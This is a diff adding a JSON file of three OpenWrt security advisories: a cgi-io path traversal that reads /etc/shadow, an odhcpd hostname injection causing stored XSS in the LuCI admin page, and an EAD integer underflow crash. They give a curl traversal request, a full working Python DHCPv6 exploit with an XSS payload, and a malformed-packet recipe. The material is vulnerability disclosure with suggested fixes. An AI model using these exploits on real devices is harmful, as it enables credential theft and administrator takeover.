@@ -1,0 +1,344 @@
+[
+ {
+  "ghsa_id": "GHSA-jw5r-xhf5-2xcq",
+  "cve_id": "CVE-2026-62947",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-jw5r-xhf5-2xcq",
+  "summary": "ACL bypass and arbitrary root file read via cgi-io cgi-download",
+  "description": "## Summary\r\n\r\nThe `cgi-download` handler in cgi-io authorizes the requested `path` against the caller's ubus session `file` ACL and then opens it without canonicalizing the path first (`main.c:540`, `main.c:557`). rpcd's ACL matcher uses `fnmatch()` without `FNM_PATHNAME` (`session.c:146`), so a wildcard in an allowed ACL glob spans `/`. A request path of the form `<allowed-glob-prefix>/../../../<target>` matches the literal allowed prefix during the ACL check, while the subsequent `open()` lets the kernel resolve the embedded `..` and reach a file outside that prefix. cgi-io runs as root, so the resolved target is any file readable by uid 0. The sibling upload handler and rpcd-mod-file both canonicalize before their ACL check and reject the same input.\r\n\r\nResult: a session holding the `cgi-io download` permission and any wildcard `file` read grant reads any root-readable file, including `/etc/shadow`, which the rpcd file API denies to that same session.\r\n\r\n## Affected\r\n\r\nOpenWrt cgi-io, git HEAD `658b14b`, as shipped in OpenWrt 25.12.4 (r32933-4ccb782af7). `/www/cgi-bin/cgi-download` is a symlink to `/usr/libexec/cgi-io`.\r\nRequires an authenticated ubus session holding `cgi-io download` (access group `luci-mod-system-flash`) plus one wildcard `file` read grant: `luci-mod-system-repokeys` (`/etc/apk/keys/*`), `luci-mod-network-config` (`/proc/sys/net/ipv[46]/conf/*`), or `luci-mod-system-flash` itself (`/dev/mtdblock[0-9]*`).\r\nOn a default single-root install the root LuCI session holds these grants. Deployments that delegate a restricted rpcd `config login` operator the flash access group are affected at a lower privilege tier.\r\nUnauthenticated requests are rejected at `main.c:537`; the read is not anonymously reachable.\r\n\r\n## Root cause\r\n\r\n`main_download` reads the `path` POST field and passes it unmodified to `session_access(sid, \"file\", fields[3], \"read\")` (`main.c:540`) and then to `open(fields[3], O_RDONLY)` (`main.c:557`). rpcd evaluates the ACL with `fnmatch(acl->object, path, FNM_NOESCAPE)` (`session.c:146`), and the missing `FNM_PATHNAME` lets a `*` in an allowed glob match `/` and therefore an entire `../` traversal suffix. Because the ACL string and the `open()` string are the same raw bytes, the check passes against the allowed prefix while the kernel resolves the `..` to a file outside it. The upload handler canonicalizes with `canonicalize_path()` before its ACL check (`main.c:372`, `main.c:348`), and rpcd-mod-file canonicalizes at `file.c:264` before `rpc_file_access` at `file.c:272`, so both reject the identical traversal. cgi-io runs as root, so the missing canonicalization on the download path turns a path-scoped read grant into a read of any uid-0-readable file.\r\n\r\n## Reproduction\r\n\r\n`openwrt/rootfs:x86_64-25.12.4` in Docker running uhttpd, ubusd, rpcd, rpcd-mod-file and LuCI, with a root password set and stock ACLs. The session below is a restricted operator holding only `luci-mod-system-flash` and `luci-mod-system-repokeys`.\r\n\r\n1. Confirm the boundary: the rpcd file API denies a direct read of `/etc/shadow` to this session.\r\n\r\n```\r\ncurl -s http://target/ubus -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"<SID>\",\"file\",\"read\",{\"path\":\"/etc/shadow\"}]}'\r\n{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":[6]}        # 6 = UBUS_STATUS_PERMISSION_DENIED\r\n```\r\n\r\n2. Request the same file through `cgi-download` with a traversal anchored on the allowed `/etc/apk/keys/*` glob.\r\n\r\n```\r\ncurl -s http://target/cgi-bin/cgi-download \\\r\n  --data-urlencode sessionid=<SID> \\\r\n  --data-urlencode 'path=/etc/apk/keys/../../../../etc/shadow' \\\r\n  --data-urlencode filename=shadow\r\n\r\nroot:$5$mvVDXOUP7en9BitX$Gkz1aD7xpioPLekqUZFkYNOvLuQ44n7QAK/c/dFnqG5:20631:0:99999:7:::\r\ndaemon:*:0:0:99999:7:::\r\n```\r\n\r\nLive-verified: the response body is byte-identical (SHA-256 match) to `/etc/shadow` on disk, including the root password hash, returned to a session that the rpcd file API denies the same read.\r\n\r\n## Impact\r\n\r\n- Disclosure of the `/etc/shadow` root password hash, crackable offline to a root login.\r\n- Disclosure of `/etc/config/*` secrets: Wi-Fi PSKs, WireGuard and OpenVPN private keys, PPPoE credentials.\r\n- Disclosure of `/etc/dropbear/*` SSH host keys and `/etc/uhttpd.key` TLS private key.\r\n- Read of any uid-0-readable file, including `/proc/<pid>/environ` and `/proc/<pid>/cmdline`.\r\n\r\n## Credit\r\n\r\nJan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+   "score": 4.9
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+    "score": 4.9
+   },
+   "cvss_v4": {
+    "vector_string": null,
+    "score": null
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "cgi-io (OpenWrt)"
+    },
+    "vulnerable_version_range": "<= 25.12.4 (cgi-io HEAD 658b14b)",
+    "patched_versions": "",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-06-29T22:56:04Z",
+  "updated_at": "2026-07-14T22:50:30Z",
+  "severity": "medium"
+ },
+ {
+  "ghsa_id": "GHSA-hhmc-92hw-535f",
+  "cve_id": "CVE-2026-62948",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-hhmc-92hw-535f",
+  "summary": "odhcpd/LuCI: unauthenticated DHCPv6 client can inject lease-file lines via FQDN hostname → stored XSS in the LuCI admin UI",
+  "description": "## Summary\r\n\r\n`odhcpd` writes a DHCPv6 client's requested hostname (its FQDN option, opt 39) into the lease\r\nstate file `/tmp/odhcpd.leases` via `fprintf(\"…%s…\", lease->hostname)` with **no escaping**. The\r\nhostname is decoded by `dn_expand()`, which copies DNS-label bytes **verbatim** — including `0x0a`\r\n(newline). A single newline **injects an arbitrary additional line** into the lease file.\r\n\r\nThat file is parsed by LuCI's `rpcd-mod-luci` `getDHCPLeases` (`fgets`+`strtok`, lines beginning\r\n`# `) and shown in the **\"Active DHCPv6 Leases\"** admin status page. LuCI renders the host cell\r\nthrough `dom.append` → `node.innerHTML` **without HTML-escaping**, so an attacker-controlled\r\nhostname becomes **live markup in the privileged admin DOM** — an unauthenticated, pre-association\r\n**stored XSS** in the device management UI.\r\n\r\nOne unauthenticated DHCPv6 REQUEST forges a lease record:\r\n\r\n```jsonc\r\n// what getDHCPLeases returns after the injection (the forged record):\r\n{ \"interface\": \"br-lan\", \"hostname\": \"<svg/onload=alert(1)>\", \"duid\": \"dd\", \"iaid\": \"1\",\r\n  \"ip6addr\": \"fd1a:bf1c:9075::1ed\" }\r\n```\r\n\r\n## Environment / affected range\r\n\r\n- **Component (injection):** `odhcpd` — `src/statefiles.c` `statefiles_write_state6()` (DHCPv6,\r\n  line ~498) and `statefiles_write_state4()` (DHCPv4, ~533, identical pattern).\r\n- **Component (render sink):** LuCI — `luci-mod-status`\r\n  (`htdocs/luci-static/resources/view/status/include/40_dhcp.js`) + `luci-base`\r\n  (`htdocs/luci-static/resources/luci.js`, `dom.append`); back-end `rpcd-mod-luci` `getDHCPLeases`\r\n  (`/usr/lib/rpcd/luci.so`).\r\n- **Hunt corpus:** odhcpd `main` @ `1782f3f` (`PKG_SOURCE_DATE=2026-06-04`), zero downstream patches.\r\n- **Live-validated build:** OpenWrt **25.12.4** (`r32933-4ccb782af7`, x86/64), kernel 6.12.87, musl;\r\n  `odhcpd-ipv6only-2026.03.16~edf2e523-r1`; `rpcd-mod-luci-20240305`; `luci-base 26.133`. odhcpd runs\r\n  on `br-lan`, `dhcp.lan.dhcpv6='server'`, `leasefile=/tmp/odhcpd.leases` — **all defaults**.\r\n- **Affected range:** `statefiles.c` is **byte-identical at upstream HEAD `03dacc2`** — present and\r\n  **unfixed**. The deployed 25.12.4 binary `/usr/sbin/odhcpd` carries the exact format strings\r\n  (`# %s %s %x %s%s …` and the `broken\\x20` marker).\r\n- **CWE-117** (improper output neutralization for logs) / **CWE-150** (improper neutralization of\r\n  escape sequences) in odhcpd → **CWE-79** (stored XSS) in LuCI.\r\n\r\n## Topology\r\n\r\nThe attack rides the LAN as an ordinary unauthenticated DHCPv6 client; the XSS fires when an admin\r\nlater opens the leases status page.\r\n\r\n```\r\n                       LAN segment  br-lan  (fw4 zone lan: input ACCEPT)\r\n  +-------------------------+                                 +----------------------------------+\r\n  |  Attacker (on-link)     |   DHCPv6 SOLICIT/REQUEST        |  OpenWrt DUT 25.12.4  10.0.2.2   |\r\n  |  fe80::a0a4:d5ff:...    |   with OPTION_FQDN(39) =        |  odhcpd [::]:547 (br-lan)        |\r\n  |  unauth DHCPv6 client   |   \"x\\n# br-lan dd 1             |   dn_expand() copies label       |\r\n  |  (no creds, no assoc)   |   <svg/onload=alert(1)> 9 0 64\" |   VERBATIM -> fprintf %s         |\r\n  |                         |  --- udp/547, ff02::1:2 ----->  |   UNESCAPED -> /tmp/odhcpd.leases|\r\n  |                         |                                 |   (forged '#'-line injected)     |\r\n  +-------------------------+                                 +----------------------------------+\r\n                                                                 | leasefile parsed by\r\n                                                                 v rpcd-mod-luci getDHCPLeases\r\n  +-------------------------+   opens \"Status > Active          +----------------------------------+\r\n  |  Admin browser          |   DHCPv6 Leases\" (UI:R)           |  LuCI 40_dhcp.js -> dom.append   |\r\n  |  authenticated LuCI     |  <----- HTTP/LuCI admin UI -----  |   -> node.innerHTML (UNESCAPED)  |\r\n  |  session                |   <svg onload> handler FIRES      |   forged hostname rendered as    |\r\n  |  (S:C, I:H)             |   in the admin's session          |   live HTML                      |\r\n  +-------------------------+                                   +----------------------------------+\r\n       WAN (fw4 zone wan: input REJECT) — not used; attack rides the LAN.\r\n```\r\n\r\n## Upstream status (checked 2026-06-22)\r\n\r\n**Novel / unfixed.** `src/statefiles.c` is byte-identical between corpus `1782f3f` and HEAD\r\n`03dacc2`; the unescaped `%s` hostname write and the `broken\\x20` marker are present and\r\nunaddressed. The only prior touch (`c29aa70`, \"fix escape sequence for broken hostname output\")\r\nmerely changed the marker **text** and was **reverted** by `24b70c5` — neither ever addressed the\r\nline injection. Distinct from the June-2026 `dhcpv6-ia.c` IA-handler cluster\r\n(CVE-2026-53918/53921/53922), which is a different file. No CVE; not in any advisory.\r\n\r\n## Root cause\r\n\r\n`src/statefiles.c`, `statefiles_write_state6()`:\r\n\r\n```c\r\n/* # <iface> <hexduid> <hexiaid> <hostname> <valid_until> <assigned_..._id> <pfx_length> ... */\r\nfprintf(ctxt->fp,\r\n    \"# %s %s %x %s%s %\" PRId64 \" %\" PRIx64 \" %\" PRIu8,\r\n    ctxt->iface->ifname, duidbuf, ntohl(lease->iaid),\r\n    lease->hostname && !lease->hostname_valid ? \"broken\\\\x20\": \"\",   /* marker only, NOT an escaper */\r\n    lease->hostname ? lease->hostname : \"-\",                          /* <-- UNESCAPED %s            */\r\n    ...);\r\n```\r\n\r\nThe `broken\\x20` marker is prepended when the hostname fails validation, but the **raw\r\n`lease->hostname` is written via `%s` regardless** — the marker does not escape anything. The\r\nhostname originates from the client FQDN option, decoded by `dn_expand()` which copies label bytes\r\nverbatim (`0x0a`, space, `#`, `/`, digits, letters all pass; only `.` is the label separator). A\r\nDNS label carries up to 63 bytes of arbitrary content.\r\n\r\n**Gate asymmetry:** the dnsmasq-hostsfile writers (`statefiles_write_host6/4`) DO bail on\r\n`!hostname_valid`, but the **lease-file writer does not** — so a control-char hostname rejected for\r\nDNS is still written verbatim here.\r\n\r\n**The LuCI render sink (why it is XSS, not just log spam):** `40_dhcp.js` builds the v6 host cell\r\nas a **bare string** (`lease.hostname`); the value flows `cbi_update_table` → `L.ui.Table.update`\r\n(`disp_val = row[i]`, a bare string) → `E('td',{…}, disp_val)` → `dom.content` → `dom.append`.\r\n`luci.js` `dom.append` renders a non-Array, non-DOM child via `node.innerHTML = \\`${children}\\`` —\r\n**unescaped**. (Array children go through `createTextNode` and would be safe; a bare string does\r\nnot.) No `escape`/`sanitize`/`textContent` appears on this path.\r\n\r\n## Steps to reproduce\r\n\r\nPoC is Python 3 stdlib only (no scapy/pip). The attacker is on-link with the LAN segment (an\r\nordinary unauthenticated DHCPv6 client); **no root needed** (falls back to an ephemeral UDP source\r\nport). Run only against an isolated lab DUT.\r\n\r\n**1. Clean baseline (negative control):**\r\n```sh\r\nssh root@10.0.2.2 '> /tmp/odhcpd.leases; /etc/init.d/odhcpd restart; sleep 2'\r\npython3 exploit_D_001_fqdn_inject.py --iface br-lan --server ff02::1:2 --benign\r\nssh root@10.0.2.2 'cat /tmp/odhcpd.leases'\r\nssh root@10.0.2.2 'ubus call luci-rpc getDHCPLeases'\r\n```\r\nExpected: SOLICIT→ADVERTISE→REQUEST→REPLY succeeds; **one** clean line; `getDHCPLeases` returns a\r\nsingle legit record `hostname:\"goodhost\"`.\r\n\r\n**2. Line-injection (forged lease record):**\r\n```sh\r\nssh root@10.0.2.2 '> /tmp/odhcpd.leases; /etc/init.d/odhcpd restart; sleep 2'\r\npython3 exploit_D_001_fqdn_inject.py --iface br-lan --server ff02::1:2\r\nssh root@10.0.2.2 'cat /tmp/odhcpd.leases'\r\nssh root@10.0.2.2 'ubus call luci-rpc getDHCPLeases'\r\n```\r\n\r\n**3. Stored-XSS payload + render proof:**\r\n```sh\r\nssh root@10.0.2.2 '> /tmp/odhcpd.leases; /etc/init.d/odhcpd restart; sleep 2'\r\npython3 exploit_D_001_fqdn_inject.py --iface br-lan --server ff02::1:2 --xss\r\nssh root@10.0.2.2 'ubus call luci-rpc getDHCPLeases' > getdhcpleases_D_001_xss.json\r\nnode render_proof_D_001.js          # renders the real reply through LuCI's dom.append logic\r\n```\r\n\r\n## Evidence (inline)\r\n\r\n**Step 2 — `cat /tmp/odhcpd.leases` after the injection** — the single real lease becomes **two**\r\nlines (the real one truncated at the `0x0a` with the `broken\\x20` marker, then the forged line):\r\n```\r\n# br-lan 00030001020000deadbe 4d3c7433 broken\\x20x\r\n# br-lan DEADBEEF 0001 PWNED-HACKER 9999999999 0 64 1782167392 1ed 128 fd1a:bf1c:9075::1ed/128\r\n```\r\n\r\n**Step 2 — `ubus call luci-rpc getDHCPLeases`** returns the **forged record**\r\n(`hostname:\"PWNED-HACKER\" duid:\"DEADBEEF\" iaid:\"0001\"`) — fully attacker-controlled.\r\n\r\n**Step 3 — `getDHCPLeases` with the XSS payload** (`getdhcpleases_D_001_xss.json`) — the raw HTML\r\nsurvives leasefile + JSON intact:\r\n```json\r\n{\r\n  \"dhcp6_leases\": [\r\n    { \"interface\": \"br-lan\", \"hostname\": \"<svg/onload=alert(1)>\", \"duid\": \"dd\", \"iaid\": \"1\",\r\n      \"ip6addr\": \"fd1a:bf1c:9075::1ed\" }\r\n  ]\r\n}\r\n```\r\n\r\n**Step 3 — `node render_proof_D_001.js`** (the lab's real reply through LuCI's exact `dom.append`):\r\n```\r\nrendered tbody.innerHTML:\r\n  <tr><td><svg onload=\"alert(1)\"></svg></td></tr>\r\nexecuting handler element(s): [ 'svg[onload=alert(1)]' ]\r\nSTORED XSS CONFIRMED\r\n```\r\n\r\n(Payload note: `<svg/onload=…>` parses to a live element under the WHATWG/HTML5 parser;\r\n`<img/src=x/onerror=…>` does **not** — the `/` mid-value is part of the value, not an attribute\r\nseparator.)\r\n\r\n## Proof-of-concept (embedded)\r\n\r\n### 1) `exploit_D_001_fqdn_inject.py` — the injection PoC (raw DHCPv6, stdlib only)\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n# VIPRE Ranger PoC for D-001 (odhcpd DHCPv6 FQDN hostname -> leasefile line injection -> LuCI XSS).\r\n# A DHCPv6 client's OPTION_CLIENT_FQDN (opt 39) hostname is decoded with dn_expand (musl copies\r\n# label bytes VERBATIM) and written UNESCAPED via fprintf into /tmp/odhcpd.leases (statefiles.c:498).\r\n# A 0x0a in the label injects a whole extra '#'-prefixed line -> a forged lease record that LuCI\r\n# rpcd-mod-luci getDHCPLeases parses and renders in the privileged admin \"Active DHCP6 Leases\" view.\r\n# Wire: SOLICIT -> ADVERTISE -> REQUEST -> REPLY (FQDN rides SOLICIT and REQUEST).\r\n# SAFETY: target ONLY an isolated lab. No root needed (falls back to an ephemeral UDP src port).\r\nimport argparse, os, random, socket, struct, sys\r\n\r\nDHCPV6_SERVER_PORT, DHCPV6_CLIENT_PORT = 547, 546\r\nMSG_SOLICIT, MSG_ADVERTISE, MSG_REQUEST, MSG_REPLY = 1, 2, 3, 7\r\nOPT_CLIENTID, OPT_SERVERID, OPT_IA_NA, OPT_IAADDR, OPT_ORO, OPT_ELAPSED, OPT_FQDN = 1, 2, 3, 5, 6, 8, 39\r\n\r\ndef opt(code, data): return struct.pack(\"!HH\", code, len(data)) + data\r\ndef build_clientid():\r\n    mac = bytes([0x02, 0x00, 0x00, 0xde, 0xad, 0xbe])      # DUID-LL (type 3), ether\r\n    return opt(OPT_CLIENTID, struct.pack(\"!HH\", 3, 1) + mac)\r\ndef build_ia_na(iaid): return opt(OPT_IA_NA, struct.pack(\"!III\", iaid, 0, 0))\r\ndef build_fqdn_option(label_bytes):\r\n    # OPTION_CLIENT_FQDN(39) = flags(1) + DNS name <len><label><0x00>. odhcpd dn_expand skips flags.\r\n    assert 1 <= len(label_bytes) <= 63 and b\".\" not in label_bytes\r\n    name = bytes([len(label_bytes)]) + label_bytes + b\"\\x00\"\r\n    return opt(OPT_FQDN, b\"\\x00\" + name)\r\ndef build_msg(t, xid, options): return bytes([t]) + xid + options\r\ndef parse_options(buf):\r\n    out, i = {}, 0\r\n    while i + 4 <= len(buf):\r\n        code, ln = struct.unpack(\"!HH\", buf[i:i+4]); i += 4\r\n        if i + ln > len(buf): break\r\n        out.setdefault(code, []).append(buf[i:i+ln]); i += ln\r\n    return out\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser()\r\n    ap.add_argument(\"--iface\", default=\"br-lan\")\r\n    ap.add_argument(\"--server\", default=\"ff02::1:2\", help=\"odhcpd link-local (scope=--iface) or ff02::1:2\")\r\n    ap.add_argument(\"--benign\", action=\"store_true\", help=\"negative control: hostname 'goodhost'\")\r\n    ap.add_argument(\"--xss\", action=\"store_true\", help=\"forge a lease whose hostname is a stored-XSS payload\")\r\n    ap.add_argument(\"--label\", default=None, help=\"raw label override (python escapes allowed)\")\r\n    args = ap.parse_args()\r\n    if args.benign:\r\n        label, kind = b\"goodhost\", \"NEGATIVE CONTROL\"\r\n    elif args.xss:\r\n        # hostname token: no space/tab/newline (strtok delims), no '.' (dn_expand/strcspn). HTML5 lets\r\n        # '/' separate tag name from attribute -> a single-tag single-attribute payload needs no spaces.\r\n        label, kind = b\"x\\n# br-lan dd 1 <svg/onload=alert(1)> 9 0 64\", \"STORED-XSS forgery\"\r\n    elif args.label is not None:\r\n        label = args.label.encode(\"latin-1\").decode(\"unicode_escape\").encode(\"latin-1\"); kind = \"CUSTOM\"\r\n    else:\r\n        # forged LuCI v6 record: '#' iface duid iaid HOSTNAME ts id length ; leading 'x' = truncated real line\r\n        label, kind = b\"x\\n# br-lan DEADBEEF 0001 PWNED-HACKER 9999999999 0 64\", \"INJECTION (forged record)\"\r\n    fqdn_opt = build_fqdn_option(label)\r\n    print(f\"[*] {kind}; label({len(label)})={label!r}; FQDN wire={fqdn_opt.hex()}\")\r\n\r\n    iaid, xid = random.randint(1, 0x7fffffff), os.urandom(3)\r\n    clientid, ia_na = build_clientid(), build_ia_na(iaid)\r\n    elapsed, oro = opt(OPT_ELAPSED, b\"\\x00\\x00\"), opt(OPT_ORO, struct.pack(\"!H\", OPT_FQDN))\r\n    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\r\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    ifidx = socket.if_nametoindex(args.iface)\r\n    try:    s.bind((\"::\", DHCPV6_CLIENT_PORT, 0, ifidx)); srcport = DHCPV6_CLIENT_PORT\r\n    except PermissionError: s.bind((\"::\", 0, 0, ifidx)); srcport = s.getsockname()[1]\r\n    s.settimeout(4.0)\r\n    dst = (args.server, DHCPV6_SERVER_PORT, 0, ifidx)\r\n    print(f\"[*] src udp/{srcport} {args.iface} -> [{args.server}]:{DHCPV6_SERVER_PORT}\")\r\n\r\n    s.sendto(build_msg(MSG_SOLICIT, xid, clientid + ia_na + elapsed + oro + fqdn_opt), dst)\r\n    print(f\"[>] SOLICIT xid={xid.hex()} iaid={iaid:#x}\")\r\n    data, _ = s.recvfrom(4096)\r\n    if data[0] != MSG_ADVERTISE: print(f\"[-] expected ADVERTISE got {data[0]}\"); return 2\r\n    adv = parse_options(data[4:])\r\n    if OPT_SERVERID not in adv: print(\"[-] no SERVERID\"); return 2\r\n    serverid = opt(OPT_SERVERID, adv[OPT_SERVERID][0])\r\n    ia_na_req = opt(OPT_IA_NA, adv[OPT_IA_NA][0]) if OPT_IA_NA in adv else ia_na   # echo assigned addr\r\n    print(f\"[<] ADVERTISE serverid={adv[OPT_SERVERID][0].hex()}\")\r\n\r\n    s.sendto(build_msg(MSG_REQUEST, xid, clientid + serverid + ia_na_req + elapsed + oro + fqdn_opt), dst)\r\n    print(\"[>] REQUEST with FQDN option\")\r\n    data, _ = s.recvfrom(4096)\r\n    if data[0] != MSG_REPLY: print(f\"[-] expected REPLY got {data[0]}\"); return 2\r\n    print(\"[+] SUCCESS: server accepted; leasefile written with our hostname.\")\r\n    s.close(); return 0\r\n\r\nif __name__ == \"__main__\":\r\n    sys.exit(main())\r\n```\r\n\r\n### 2) `render_proof_D_001.js` — the stored-XSS confirmation (LuCI's exact `dom.append` logic)\r\n\r\nFeeds the real lab `getDHCPLeases` reply through LuCI's `dom.append` branch (jsdom) to prove the\r\nforged hostname lands in the admin DOM as a live element. Run: `npm i jsdom && node render_proof_D_001.js`.\r\n\r\n```javascript\r\n// Renders the REAL lab getDHCPLeases JSON through LuCI's EXACT dom.append branch.\r\nconst { JSDOM } = require('jsdom');\r\nconst fs = require('fs');\r\nconst leases = JSON.parse(fs.readFileSync(__dirname + '/getdhcpleases_D_001_xss.json', 'utf8'));\r\nfunction luci_dom_append(td, children) {            // verbatim luci.js dom.append branch logic\r\n  if (Array.isArray(children)) {}\r\n  else if (typeof children === 'function') {}\r\n  else if (children && children.nodeType) { td.appendChild(children); }\r\n  else if (children !== null && children !== undefined) { td.innerHTML = `${children}`; }   // <-- sink\r\n  return td;\r\n}\r\nconst dom = new JSDOM('<table><tbody></tbody></table>');\r\nconst doc = dom.window.document, tbody = doc.querySelector('tbody');\r\nlet fired = [];\r\nfor (const lease of leases.dhcp6_leases) {\r\n  const host = lease.hostname;                       // 40_dhcp.js: host = lease.hostname (bare string)\r\n  const tr = doc.createElement('tr'), td = doc.createElement('td');\r\n  luci_dom_append(td, host); tr.appendChild(td); tbody.appendChild(tr);\r\n  const e = td.querySelector('[onload],[onerror],[ontoggle],[onfocus],script');\r\n  if (e) fired.push(`${e.tagName}[${e.getAttributeNames().filter(a => a.startsWith('on')).map(a => a + '=' + e.getAttribute(a))}]`);\r\n}\r\nconsole.log(\"rendered tbody.innerHTML:\\n  \" + tbody.innerHTML);\r\nconsole.log(\"executing handler element(s):\", fired.length ? fired : \"(none)\");\r\nconsole.log(fired.length ? \"STORED XSS CONFIRMED\" : \"no handler\");\r\n```\r\n\r\n## Impact and severity\r\n\r\n**CVSS:3.1 `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = 9.6 (Critical).**\r\n\r\n- **AV:N / PR:N** — any on-link, unauthenticated DHCPv6 client (no credentials, no association).\r\n  **AC:L**, single packet.\r\n- **UI:R** — fires when an administrator opens the DHCPv6 leases status page (routine, passive).\r\n- **S:C** — odhcpd injects content that executes in a *different* security authority: the admin's\r\n  authenticated browser / LuCI session.\r\n- **C:H / I:H/ A:H** — the payload runs in the device's full management UI; it can read page state and\r\n  issue privileged `uci`/ubus actions on the admin's behalf (arbitrary config change). Full admin account takeover\r\n\r\nForged-record-only baseline (no XSS lift): `S:U/C:N/I:L/A:N` = **5.3** (spoofed lease entries in\r\nthe admin view).\r\n\r\n## Suggested fix\r\n\r\nFix both layers:\r\n\r\n1. **odhcpd (`src/statefiles.c`):** reject or escape control characters in the hostname before\r\n   writing the lease file (and the dnsmasq hostsfile). At minimum strip/reject bytes `< 0x20` so a\r\n   hostname can never contain a newline; ideally restrict to the LDH set. Make `broken\\x20` a real\r\n   escaper, not a cosmetic prefix.\r\n2. **LuCI (`40_dhcp.js` / `luci-base` `dom.append`):** render the host cell as a text node (Array\r\n   child / `createTextNode`) or HTML-escape it before the `innerHTML` branch. Any network-controlled\r\n   string flowing into a LuCI table cell via `dom.append` is a stored-XSS sink.\r\n",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+   "score": 9.6
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+    "score": 9.6
+   },
+   "cvss_v4": {
+    "vector_string": null,
+    "score": null
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "odhcpd/luci"
+    },
+    "vulnerable_version_range": "main",
+    "patched_versions": "",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-06-29T22:56:13Z",
+  "updated_at": "2026-07-14T22:51:15Z",
+  "severity": "critical"
+ },
+ {
+  "ghsa_id": "GHSA-9558-77jp-g3fw",
+  "cve_id": "CVE-2026-55490",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-9558-77jp-g3fw",
+  "summary": "EAD Integer Underflow → Pre-Auth Denial of Service",
+  "description": "### Summary\r\n\r\nAn integer underflow in `handle_send_a()` of the Emergency Access Daemon (EAD) allows any\r\nunauthenticated attacker on the local network to crash the daemon by sending a single crafted\r\nUDP packet. No credentials are required — only a valid username (e.g. `root`) present in\r\n`/etc/passwd`.\r\n\r\n---\r\n\r\n### Details\r\n\r\nIn `handle_send_a()` (lines 426–447 of `ead.c`), the message length is computed as:\r\n\r\n```c\r\n// len is declared as int\r\nlen = ntohl(msg->len) - sizeof(struct ead_msg_number);\r\n```\r\n\r\n`sizeof(struct ead_msg_number)` is `1` (one `uint8_t` field + flexible array).  \r\nThe subtraction is performed in **unsigned arithmetic** (C usual arithmetic conversions):\r\nif `msg->len == 0`, then `0u - 1u = 0xFFFFFFFF`.  \r\nThis value is then assigned to the `int len`, yielding `-1` on every two's-complement\r\narchitecture (ARM, MIPS, x86, RISC-V — the full set of OpenWrt targets).\r\n\r\nThe bounds check that follows is:\r\n\r\n```c\r\nif (len > MAXPARAMLEN + 1)   // -1 > 257 → FALSE → check bypassed\r\n    return false;\r\n```\r\n\r\n`memcpy` is then called with `len` implicitly cast to `size_t`, producing `SIZE_MAX`:\r\n\r\n```c\r\nA.len  = len;       // -1\r\nA.data = abuf;\r\nmemcpy(A.data, number->data, len);  // memcpy(..., SIZE_MAX) → crash\r\n```\r\n\r\n**Why the packet passes all prior validation:**\r\n\r\nThe dispatcher in `parse_message()` only checks that the *captured packet length* is\r\n`≥ sizeof(struct ead_packet) + 1`. It does **not** validate `msg->len`.  \r\n`handle_packet()` (line 670) additionally requires:\r\n\r\n```c\r\nif (h->len < sizeof(struct ead_packet) + ntohl(pkt->msg.len))\r\n    return;\r\n```\r\n\r\nWhen `msg->len == 0`, this reduces to `h->len >= sizeof(struct ead_packet)`.  \r\nA packet with `h->len = sizeof(struct ead_packet) + 1` and `msg->len = 0` therefore\r\n**passes every check** and reaches the vulnerable `memcpy`.\r\n\r\n---\r\n\r\n### Proof of Concept\r\n\r\n**Prerequisites:** attacker on the same Layer-2/3 segment as the EAD daemon (UDP/56026).\r\n\r\n**Step 1 — Establish session with a valid username:**\r\n```\r\n# EAD_TYPE_SET_USERNAME  →  username = \"root\"\r\n# EAD_TYPE_GET_PRIME     →  retrieve SRP prime (no auth required)\r\n```\r\n\r\n**Step 2 — Send the malformed EAD_TYPE_SEND_A packet:**\r\n```\r\nh->len   = sizeof(struct ead_packet) + 1   # passes handle_packet() check\r\nmsg->len = 0x00000000                      # triggers underflow in handle_send_a()\r\n```\r\n\r\n**Result:** `memcpy(abuf, number->data, SIZE_MAX)` is invoked, causing an immediate\r\nout-of-bounds read and daemon crash (SIGSEGV / SIGBUS).\r\n\r\n**No password knowledge is required.**\r\n\r\n---\r\n\r\n### Impact\r\n\r\n- **Type:** Denial of Service (daemon crash)\r\n- **Vector:** Adjacent Network, no authentication required\r\n- **Who is impacted:** Any OpenWrt device with EAD enabled and reachable on UDP/56026.\r\n  EAD is used as an emergency remote-access mechanism; crashing it eliminates the\r\n  emergency recovery capability and may be a precursor to a broader attack.\r\n- **Potential escalation:** The same `len = -1` path passes a `size_t`-cast to `memcpy`;\r\n  on 32-bit targets where `SIZE_MAX == 0xFFFFFFFF` the read wraps the process address\r\n  space and could, under specific heap/BSS layouts, be leveraged beyond a simple crash.\r\n\r\n---\r\n\r\n### Suggested Fix\r\n\r\n```c\r\n// Validate BEFORE the subtraction to avoid underflow\r\nuint32_t msg_len = ntohl(msg->len);\r\nif (msg_len < sizeof(struct ead_msg_number))\r\n    return false;\r\n\r\nint len = (int)(msg_len - sizeof(struct ead_msg_number));\r\nif (len > MAXPARAMLEN + 1)\r\n    return false;\r\n```\r\n",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+   "score": 6.5
+  },
